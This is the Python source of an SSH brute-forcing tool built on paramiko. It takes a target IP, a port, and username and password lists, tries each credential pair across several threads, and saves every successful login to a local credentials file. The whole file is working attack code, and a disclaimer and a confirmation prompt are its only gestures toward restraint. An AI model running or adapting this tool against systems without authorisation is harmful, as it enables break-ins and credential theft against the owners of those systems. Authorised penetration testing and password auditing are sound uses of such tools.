# Imports
import ipaddress
import threading
import time
import logging
import argparse
import queue
import os
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

# Constants
DESCRIPTION = "SSH Brute Forcing Tool (c) 2022 by Sagi Vultur - "\
            "This code DOES NOT promote or encourage any illegal activities!"
CLARIFY = " Clarify - For the tool to work you have to insert at least 3 parameters: host, user / users file, password / passwords file"
CREDENTIALS_FILE = "credentials.txt"
NEXT_LINE = '\n'
READ = 'r'
APPEND = 'a'


def valid_ip_address(host):

    # Check if the ip is a valid IPv4 address
    try:
        ipaddress.IPv4Address(host)
        return host

    # If host is not a valid IPv4 address we raise a error
    except ipaddress.AddressValueError:
        raise ValueError("Please insert a valid ip address")


# This function is responsible for the ssh connection
def ssh_connect(host, username, queue_, port):

    # While there are password not being use
    while not queue_.empty():
        password = queue_.get()
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())

        # We attempt to connect to the host in ssh, with the given credentials
        try:
            ssh_client.connect(host,port=port ,username=username, password=password, banner_timeout=300)

            with open(CREDENTIALS_FILE, APPEND) as cred_file:

                print(f" *** Username - ({username}) and Password - ({password}) found! *** ")
                current_time = time.ctime()
                cred_file.write(f"\nUsername: {username}\nPassword: {password}\nHost: {host}\nTime: {current_time}\n")

        # The user and the password are Incorrect
        except AuthenticationException:
            print(f"Username - ({username}) and Password - ({password}) are Incorrect.")

        # If there was a problem with the commection, then try again later
        except ssh_exception.SSHException:
            queue_.put(password)
    return


def main():

    parser = argparse.ArgumentParser(description=DESCRIPTION, epilog=CLARIFY)
    parser.add_argument("-i" ,"--host", type=str,
                        help="The target ip", metavar='')
    parser.add_argument("-u" ,"--user", type=str,
                        help="The login username", metavar='')
    parser.add_argument("-U" ,"--users_file", type=str,
                        help="Loading several usernames from a file", metavar='')
    parser.add_argument("-p" ,"--password", type=str,
                        help="The login password", metavar='')
    parser.add_argument("-P" ,"--passwords_file", type=str,
                        help="Loading several passwords from a file", metavar='')
    parser.add_argument("-s" , "--port", type=int, default = 22, metavar='',
                        help="Define the port ssh use, The default is 22")
    parser.add_argument("-t" , "--thread_number", type=int, default = 8, metavar='',
                        help="The number of threads for the passwords search, The default is 8 threads")
    args = parser.parse_args()

    host = valid_ip_address(args.host)
    user = args.user
    users_path = args.users_file
    password = args.password
    passwords_path = args.passwords_file
    port = args.port
    thread_number = args.thread_number

    check = input(f"Are you sure you want to attack {host}? yes/no ")


    # Last check before running
    if check.lower() != 'yes':
        raise SystemExit("Terminating the program")

    print("Starting Attack...\n")
    logging.getLogger('paramiko.transport').addHandler(NullHandler())

    # Does the user use users file or a single user
    if users_path:
        with open(users_path, READ) as users_file:
            users = users_file.readlines()
    else:
        users = [user]

    # Does the user use passwords file or a single password
    if passwords_path:
        with open(passwords_path, READ) as passwords_file:
            passwords = passwords_file.readlines()

    else:
        passwords = [password]
        thread_number = 1

    # Going through all the users
    for user in users:

        user = user.replace(NEXT_LINE,'')
        # Checking if the variable user is empty or blank
        if not (user and  user.strip()):
            continue

        queue_ = queue.Queue()

        # Going through all the passwords
        for password in passwords:
            password = password.replace(NEXT_LINE,'')
            queue_.put(password)

        threads = []

        # Starting theads for the passwords guessing
        for i in range(0, thread_number):
            ssh_thread = threading.Thread(target=ssh_connect, args=(host, user, queue_, port))
            ssh_thread.start()
            threads.append(ssh_thread)

        # Using thread join method for all the threads
        for ssh_thread in threads:
            ssh_thread.join()


if __name__ == "__main__":
    main()

